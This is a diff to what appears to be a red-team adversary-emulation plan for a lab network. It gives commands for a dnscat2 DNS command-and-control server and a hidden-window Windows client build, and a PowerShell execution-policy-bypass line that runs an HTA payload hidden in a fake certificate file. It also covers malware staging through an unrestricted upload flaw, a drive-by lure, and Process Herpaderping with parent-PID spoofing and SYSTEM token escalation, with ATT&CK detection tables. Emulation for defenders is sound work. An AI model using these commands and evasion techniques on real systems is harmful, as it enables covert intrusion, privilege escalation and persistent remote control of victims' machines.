@@ -17,7 +17,7 @@ On the second path, the attacker directly exploits a React Server Components des
 - ☣️ On the attacker machine, start the dnscat2 server listener
 
   ```bash
-  ruby dnscat2.rb --dns "domain=c2.attacker.local,host=0.0.0.0" --no-cache --secret=<pre-shared-key>
+  ruby dnscat2.rb --dns "domain=attacker.local,host=0.0.0.0" --security=open --secret=c7517dee4fcbe16a0c8c1f98cdc5ce4e
   ```
 
   - ***Expected Output***
@@ -26,6 +26,18 @@ On the second path, the attacker directly exploits a React Server Components des
     New window created: 0
     dnscat2> Listening for connections...
     ```
+
+- ☣️ Build `dnscat2.exe` (Go client) — domain mode, DNS resolver auto-detected from victim's registry
+
+  ```bash
+  cd resources/payloads/dnscat2/go-client
+  GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
+    -X main.DefaultDomain=attacker.local \
+    -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
+    -o dnscat2.exe ./cmd/dnscat/
+  ```
+
+  Output binary: `resources/payloads/dnscat2/go-client/dnscat2.exe`
 
 - ☣️ Build `CWLHerpaderping.exe` from source with the correct payload drop path
 
@@ -55,19 +67,6 @@ On the second path, the attacker directly exploits a React Server Components des
     powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\cert_bundle.txt')"
     ```
 
-- ☣️ Upload required files to `upload.testlab.local` via the file upload interface
-
-  | File | Upload path |
-  | - | - |
-  | `staging.html` | `/uploads/staging.html` |
-  | `dnscat2.exe` | `/uploads/dnscat2.exe` |
-  | `CWLHerpaderping.exe` | `/uploads/CWLHerpaderping.exe` |
-
-- Verify the lure page is reachable from a browser on the attacker machine
-
-  ```
-  http://upload.testlab.local/uploads/staging.html
-  ```
 
 ---
 
@@ -101,6 +100,20 @@ launches it via `mshta.exe`.
 
 ### Procedures
 
+- ☣️ Upload required files to `upload.testlab.local` via the file upload interface
+
+  | File | Upload path |
+  | - | - |
+  | `staging.html` | `/uploads/staging.html` |
+  | `dnscat2.exe` | `/uploads/dnscat2.exe` |
+  | `CWLHerpaderping.exe` | `/uploads/CWLHerpaderping.exe` |
+
+- ☣️ Verify the lure page is reachable from a browser on the attacker machine
+
+  ```
+  http://upload.testlab.local/uploads/staging.html
+  ```
+
 - Deliver the lure URL `http://upload.testlab.local/uploads/staging.html` to the
   victim user via internal communication (chat, email, or redirected intranet page)
 
@@ -121,6 +134,8 @@ launches it via `mshta.exe`.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
 |  - | - | - | - | - | - | - | - | - | - | -
+| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST multipart file upload to `upload.testlab.local` upload interface deposits attacker-controlled files in `/uploads/`; no authentication required; server accepts arbitrary file types | Not Calibrated - Not Benign | Attacker exploits unrestricted file upload vulnerability on `upload.testlab.local` to stage `staging.html`, `dnscat2.exe`, and `CWLHerpaderping.exe` on victim infrastructure | upload.testlab.local | attacker | - | -
+| Command and Control | T1105 | Ingress Tool Transfer | Windows | Files `staging.html`, `dnscat2.exe`, `CWLHerpaderping.exe` appear in `/uploads/` on `upload.testlab.local` via multipart POST; no prior authentication or session | Not Calibrated - Not Benign | Attacker transfers malware and lure page from attacker machine into victim environment via file upload vulnerability | upload.testlab.local | attacker | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html), [dnscat2.exe](../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
 | Initial Access | T1189 | Drive-by Compromise | Windows | User visits `http://upload.testlab.local/uploads/staging.html` which initiates file assembly and download without server-side file request | Not Calibrated - Not Benign | Victim visits attacker-hosted lure page masquerading as Entra ID certificate portal | upload.testlab.local, victim-workstation | domain user | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
 | Defense Evasion | T1027.006 | Obfuscated Files or Information: HTML Smuggling | Windows | `cert_bundle.txt` downloaded to `Downloads/` with no outbound HTTP request for that file; browser Blob URL `blob:http://upload.testlab.local/...` created client-side | Not Calibrated - Not Benign | `staging.html` reconstructs `cert_bundle.txt` from base64 blob embedded in the HTML; no server request for the file | victim-workstation | domain user | [staging.html triggerDownload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
 | Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `cert_bundle.txt` contains base64-encoded content structured between PEM `-----BEGIN CERTIFICATE-----` / `-----END CERTIFICATE-----` delimiters, concealing an HTA payload inside a file that appears to be a legitimate certificate bundle | Not Calibrated - Not Benign | `encode-command.py` produces `cert_bundle.txt` as a polyglot file: PEM header/footer wrap base64-encoded HTA bytes, making the payload appear as a certificate file to the user | victim-workstation | domain user | [encode-command.py encode_pem()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
@@ -155,21 +170,21 @@ to `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`, and renames it to
 to remove forensic evidence, writes the bytes into a temporary file in `%TEMP%`,
 and creates an image section from that file with `NtCreateSection`.
 
-Before creating the ghost process, `GetNonJobParent()` enumerates running
-processes and obtains an `explorer.exe` or `wininit.exe` handle with
-`PROCESS_CREATE_PROCESS` rights. This handle is passed as the parent to
-`NtCreateProcessEx`, so the ghost process appears in the process tree as a child
-of a legitimate Windows process rather than the `mshta.exe` → `CertEnrollAgent.exe`
-ancestry chain.
+Before creating the ghost process, `GetNonJobParent()` enumerates running processes
+and selects a `svchost.exe` instance in Session 0 — verified via `ProcessIdToSessionId`
+— as the parent handle passed to `NtCreateProcessEx`. This places the ghost in
+Session 0 with `svchost.exe` as its visible parent in the process tree, regardless
+of which users are currently logged in. Spoofing to interactive-session processes
+such as `explorer.exe` causes an immediate anomaly kill when the ghost token is
+reassigned to SYSTEM.
 
-After the ghost is created, `NtSetInformationProcess(ProcessAccessToken)` is
-called with a duplicate of the calling process's primary token. This reassigns the
-token the ghost will execute under — overriding the parent process's token that
-would otherwise be inherited. A thread is then started at the payload entry point
-via `NtCreateThreadEx`. At this point — after the section is already mapped and
-the thread is running — the temporary file on disk is overwritten with benign
-content. Any forensic tool or EDR that reads the file after the fact sees only
-garbage. The ghost process is given fake parameters identifying it as
+After the ghost is created, `NtSetInformationProcess(ProcessAccessToken)` is called
+with a duplicate of the calling process's primary token, overriding the inherited
+`svchost.exe` token. A thread is then started at the payload entry point via
+`NtCreateThreadEx`. At this point — after the section is already mapped and the
+thread is running — the temporary file on disk is overwritten with benign content.
+Any forensic tool or EDR that reads the file after the fact sees only garbage. The
+ghost process is given fake parameters identifying it as
 `C:\Windows\System32\RuntimeBroker.exe`.
 
 All five sensitive NT API calls (`NtCreateSection`, `NtCreateProcessEx`,
@@ -222,11 +237,12 @@ configured at setup.
 | Execution | T1106 | Native API | Windows | `mshta.exe` makes outbound HTTP GET to `upload.testlab.local` for `dnscat2.exe` and `CWLHerpaderping.exe` via `MSXML2.XMLHTTP` | Not Calibrated - Not Benign | HTA VBScript downloads two binaries from the attacker-controlled server | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
 | Command and Control | T1105 | Ingress Tool Transfer | Windows | `mshta.exe` writes binary content to `C:\ProgramData\CertCA.bin` and `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin` via `ADODB.Stream.SaveToFile` | Not Calibrated - Not Benign | HTA dropper fetches and drops dnscat2 beacon and Herpaderping loader to disk | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
 | Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `CertEnrollAgent.exe` drops to `%APPDATA%\Microsoft\Windows\`, a path associated with legitimate Windows components | Not Calibrated - Not Benign | Herpaderping loader written under a legitimate-looking name and path | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
-| Defense Evasion | T1055 | Process Injection | Windows | Process whose `ImageFileName` is `RuntimeBroker.exe` but whose mapped image section does not match the file at that path on disk; parent PID in process tree is `explorer.exe` or `wininit.exe` | Not Calibrated - Not Benign | `CertEnrollAgent.exe` (CWLHerpaderping) creates a ghost process: section mapped from dnscat2, PPID spoofed to explorer.exe/wininit.exe via `GetNonJobParent()`, then on-disk temp file overwritten with junk | victim-workstation | domain user | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
-| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | Ghost process PPID resolves to `explorer.exe` or `wininit.exe` rather than `CertEnrollAgent.exe`; `NtCreateProcessEx` called with a non-current process handle | Not Calibrated - Not Benign | `GetNonJobParent()` finds a non-job-object process (`explorer.exe`/`wininit.exe`) and passes its handle as parent to `NtCreateProcessEx`; ghost process inherits that PID in the process tree | victim-workstation | domain user | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Defense Evasion | T1055 | Process Injection | Windows | Process whose `ImageFileName` is `RuntimeBroker.exe` but whose mapped image section does not match the file at that path on disk; PPID resolves to `svchost.exe` in Session 0 | Not Calibrated - Not Benign | `CertEnrollAgent.exe` (CWLHerpaderping) creates a ghost process: section mapped from dnscat2, PPID spoofed to `svchost.exe` Session 0 via `GetNonJobParent()` with `ProcessIdToSessionId` filter, then on-disk temp file overwritten with junk | victim-workstation | domain user | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | Ghost process PPID resolves to `svchost.exe` (Session 0) rather than `CertEnrollAgent.exe`; `NtCreateProcessEx` called with handle to a Session 0 `svchost.exe` instance | Not Calibrated - Not Benign | `GetNonJobParent()` enumerates processes, filters to Session 0 only via `ProcessIdToSessionId`, opens first available `svchost.exe` with `PROCESS_CREATE_PROCESS`, passes handle to `NtCreateProcessEx` as parent | victim-workstation | domain user | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `C:\ProgramData\CertCA.bin` deleted immediately after being read into memory by `CertEnrollAgent.exe` | Not Calibrated - Not Benign | Herpaderping deletes the payload file from disk after reading it to remove forensic evidence | victim-workstation | domain user | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
-| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | Unusual volume of DNS queries from workstation to `c2.attacker.local`; queries contain encoded subdomain labels characteristic of dnscat2 | Not Calibrated - Not Benign | dnscat2 beacon tunnels C2 traffic over DNS queries to attacker-controlled nameserver | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
+| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | Unusual volume of DNS queries from workstation to `attacker.local`; queries contain encoded subdomain labels characteristic of dnscat2 | Not Calibrated - Not Benign | dnscat2 beacon tunnels C2 traffic over DNS queries to attacker-controlled nameserver | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
 | Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | Windows | DNS query payloads encrypted with pre-shared key; traffic is opaque to DNS inspection | Not Calibrated - Not Benign | dnscat2 encrypts C2 traffic with a symmetric pre-shared key | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
+| Discovery | T1012 | Query Registry | Windows | Registry key `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` read via `RegOpenKeyEx` / `RegEnumKeyEx` / `RegQueryValueEx` by the dnscat2 ghost process (`RuntimeBroker.exe`); no child process; registry reads from a process whose on-disk image does not match `RuntimeBroker.exe` | Not Calibrated - Not Benign | dnscat2 enumerates all TCP/IP interface GUIDs and reads `NameServer` / `DhcpNameServer` registry values to discover the DNS resolver to use for C2 domain tunneling | victim-workstation | domain user | [getdns_windows.go getSystemDNS()](../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
 
 ---
 
@@ -274,15 +290,13 @@ path — as `NT AUTHORITY\SYSTEM`. CertEnrollAgent reads `C:\ProgramData\CertCA.
 from disk, writes the bytes into a temp file, and creates an image section via
 `NtCreateSection`.
 
-Two patches are critical here. First, `GetNonJobParent()` finds `explorer.exe`
-or `wininit.exe` — a process that is **not** inside the IIS Job Object — and
-passes its handle as parent to `NtCreateProcessEx`. Because the parent is outside
-the Job Object, the ghost process is created outside it as well, escaping the
-Job Object's restrictions. Second, after `NtCreateProcessEx`, `NtSetInformationProcess
-(ProcessAccessToken)` assigns a duplicate of CertEnrollAgent's own primary token
-(SYSTEM) to the ghost process — overriding the `explorer.exe` token that would
-otherwise be inherited. Without this fixup, the ghost would run as a regular
-desktop user rather than `NT AUTHORITY\SYSTEM`.
+`GetNonJobParent()` finds a `svchost.exe` instance in Session 0 (filtered by
+`ProcessIdToSessionId`) and passes its handle as parent to `NtCreateProcessEx`.
+The ghost is therefore created in Session 0 with `svchost.exe` as PPID, avoiding
+the session anomaly that occurs when SYSTEM-token processes are parented to
+interactive-session processes. `NtSetInformationProcess(ProcessAccessToken)` then
+assigns a duplicate of CertEnrollAgent's own primary token (SYSTEM) to the ghost
+process, overriding the inherited `svchost.exe` token.
 
 The on-disk temp file is then overwritten with junk. The ghost process presents
 as `C:\Windows\System32\RuntimeBroker.exe` and dnscat2 begins tunnelling C2
@@ -384,15 +398,16 @@ C2 pivot.
 | Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Windows | JavaScript payload delivered as `eval(String.fromCharCode(<decimal-list>))` with no readable string literals; source code is not present in server logs or request bodies | Not Calibrated - Not Benign | All `fs` API calls and path strings are encoded as charcode arrays to evade string-based log detection | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py to_charcode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
 | Command and Control | T1105 | Ingress Tool Transfer | Windows | Multiple sequential POST requests to RSC endpoint each writing or appending a 2,000-char block to `C:\Windows\Temp\CertEnrollSvc.b64` via `fs.writeFileSync` / `fs.appendFileSync`; no outbound connection from server | Not Calibrated - Not Benign | `upload` command transfers CertEnrollSvc.exe encoded as base64 in chunks via eval-based `fs` writes — no child process spawned | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
 | Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | POST to RSC endpoint triggers `fs.writeFileSync` with `Buffer.from(..., 'base64')` converting `CertEnrollSvc.b64` to `CertEnrollSvc.exe` in `C:\Windows\Temp`; no decoder binary or child process | Not Calibrated - Not Benign | `decode` command decodes base64 file to PE binary using Node.js `Buffer` API via eval — no spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
-| Execution | T1106 | Native API | Windows | `child_process.spawn` called from eval payload with `{detached:true, stdio:'ignore'}`; `.unref()` immediately decouples the child from the iisnode worker; web request completes normally with no output; `CertEnrollSvc.exe` created as child of `node.exe` without `cmd.exe` as intermediary | Not Calibrated - Not Benign | eval detached spawn launches `CertEnrollSvc.exe` directly from react2shell; CertEnrollSvc internally spawns `CertEnrollAgent.exe` as SYSTEM via `CreateProcessAsUser`; single react2shell session, no intermediate C2 pivot | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py](../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
-| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | Windows | `CertEnrollSvc.exe` spawns a process (`pid` visible in output) with SYSTEM token; MS-EFSR `EfsRpcEncryptFileSrv` named pipe binding observed on `\pipe\lsarpc` | Not Calibrated - Not Benign | CertEnrollSvc exploits CVE-2021-36942 (MS-EFSR) to coerce SYSTEM impersonation token from `lsarpc` named pipe | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/EfsPotato/CertEnrollSvc.exe) | -
-| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | Process created by `CertEnrollSvc.exe` runs as `NT AUTHORITY\SYSTEM`; `CertEnrollSvc.exe` itself is a child of the iisnode worker (`node.exe`) launched via eval detached spawn | Not Calibrated - Not Benign | CertEnrollSvc uses `SeImpersonatePrivilege` held by the AppPool identity to impersonate the SYSTEM token and call `CreateProcessAsUser`; invoked directly from react2shell via eval detached spawn — no intermediate C2 session required | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/EfsPotato/CertEnrollSvc.exe) | -
-| Defense Evasion | T1055.012 | Process Injection: Process Hollowing | Windows | Process whose `ImageFileName` is `RuntimeBroker.exe` but whose mapped image section does not match the file at that path on disk; parent PID resolves to `explorer.exe` or `wininit.exe`; created by `CertEnrollAgent.exe` running as SYSTEM | Not Calibrated - Not Benign | CWLHerpaderping creates a ghost process from dnscat2 bytes mapped via `NtCreateSection`; PPID spoofed to escape IIS Job Object; on-disk temp file overwritten with junk after mapping | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
-| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | Ghost process PPID resolves to `explorer.exe`/`wininit.exe`; `NtCreateProcessEx` invoked with handle to a process outside the IIS Job Object | Not Calibrated - Not Benign | `GetNonJobParent()` obtains handle to `explorer.exe`/`wininit.exe` (not in IIS Job Object) and passes it to `NtCreateProcessEx`; ghost process escapes Job Object constraints; `NtSetInformationProcess(ProcessAccessToken)` then reassigns SYSTEM token to ghost, overriding inherited explorer.exe token | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Execution | T1106 | Native API | Windows | `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` resolved dynamically via `GetProcAddress` from `ntdll.dll`; all five wrapped with stack spoofer planting fake return address inside `kernel32.dll`; one `WriteProcessMemory` Win32 call for PEB `ProcessParameters` pointer only (not spoofed) | Not Calibrated - Not Benign | CWLHerpaderping (`CertEnrollAgent.exe`) calls NT native APIs directly from `ntdll.dll` to create the ghost process and inject the dnscat2 payload; the five injection-critical calls are stack-spoofed; a single `WriteProcessMemory` is used to write the `ProcessParameters` pointer into the remote PEB | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | Process created by `CertEnrollSvc.exe` runs as `NT AUTHORITY\SYSTEM`; `CertEnrollSvc.exe` itself is a child of the iisnode worker (`node.exe`) launched via eval detached spawn | Not Calibrated - Not Benign | CertEnrollSvc uses `SeImpersonatePrivilege` held by the AppPool identity to impersonate the SYSTEM token via MS-EFSR named pipe coercion | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/EfsPotato/CertEnrollSvc.exe) | -
+| Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with the impersonation token obtained via `WindowsIdentity.GetCurrent().Token` after `ImpersonateNamedPipeClient`; child process (`CertEnrollAgent.exe`) created with `CREATE_NO_WINDOW` (`0x08000000`) | Not Calibrated - Not Benign | After `ImpersonateNamedPipeClient` acquires the SYSTEM impersonation token, CertEnrollSvc reads it via `WindowsIdentity.GetCurrent().Token` and passes it directly to `CreateProcessAsUser` to spawn `CertEnrollAgent.exe` as SYSTEM | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/EfsPotato/CertEnrollSvc.exe) | -
+| Defense Evasion | T1055 | Process Injection | Windows | Process created via `NtCreateProcessEx` from a `SEC_IMAGE` section backed by a temp file; temp file subsequently overwritten with junk — on-disk image no longer matches in-memory image; `ImageFileName` shows `RuntimeBroker.exe`; no `CREATE_SUSPENDED` or `NtUnmapViewOfSection` visible; PPID resolves to `svchost.exe` Session 0 | Not Calibrated - Not Benign | CWLHerpaderping uses the Process Herpaderping technique: writes dnscat2 payload to temp file, maps `NtCreateSection(SEC_IMAGE)`, spawns ghost process via `NtCreateProcessEx` from that section, then overwrites the temp file with junk — process runs from in-memory section while on-disk file is corrupted | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | Ghost process PPID resolves to `svchost.exe` or `wininit.exe` (Session 0); `NtCreateProcessEx` invoked with handle to a Session 0 non-PPL process; `NtSetInformationProcess(ProcessAccessToken)` then reassigns SYSTEM token to ghost | Not Calibrated - Not Benign | `GetNonJobParent()` iterates `svchost.exe` then `wininit.exe` as fallback, filtering to Session 0 via `ProcessIdToSessionId`; opens first match with `PROCESS_CREATE_PROCESS` and passes handle to `NtCreateProcessEx`; token fixup overrides inherited parent token with SYSTEM | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `C:\ProgramData\CertCA.bin` deleted immediately after being read into memory by `CertEnrollAgent.exe` running under SYSTEM token | Not Calibrated - Not Benign | CWLHerpaderping deletes the dnscat2 payload file from disk after reading it to memory to remove forensic evidence | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | Ghost process created by `CertEnrollAgent.exe` has `ImageFileName` of `C:\Windows\System32\RuntimeBroker.exe`; in-memory image is dnscat2 | Not Calibrated - Not Benign | CWLHerpaderping spawns ghost process with spoofed image path to blend with legitimate Windows processes | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
-| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | Unusual volume of DNS queries from IIS server to `c2.attacker.local`; queries contain encoded subdomain labels characteristic of dnscat2 | Not Calibrated - Not Benign | dnscat2 C2 session established from IIS server as SYSTEM via Herpaderping ghost process; bootstrapped from a single react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
+| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | Unusual volume of DNS queries from IIS server to `attacker.local`; queries contain encoded subdomain labels characteristic of dnscat2 | Not Calibrated - Not Benign | dnscat2 C2 session established from IIS server as SYSTEM via Herpaderping ghost process; bootstrapped from a single react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
 | Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | Windows | DNS query payloads encrypted with pre-shared key; traffic is opaque to DNS inspection | Not Calibrated - Not Benign | dnscat2 encrypts C2 traffic with the same pre-shared key configured in Step 0 | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
+| Discovery | T1012 | Query Registry | Windows | Registry key `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` read via `RegOpenKeyEx` / `RegEnumKeyEx` / `RegQueryValueEx` by the dnscat2 ghost process (`RuntimeBroker.exe`); no child process; registry reads from a process whose on-disk image does not match `RuntimeBroker.exe` | Not Calibrated - Not Benign | dnscat2 enumerates all TCP/IP interface GUIDs and reads `NameServer` / `DhcpNameServer` registry values to discover the DNS resolver for C2 domain tunneling | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
 
 ---
 
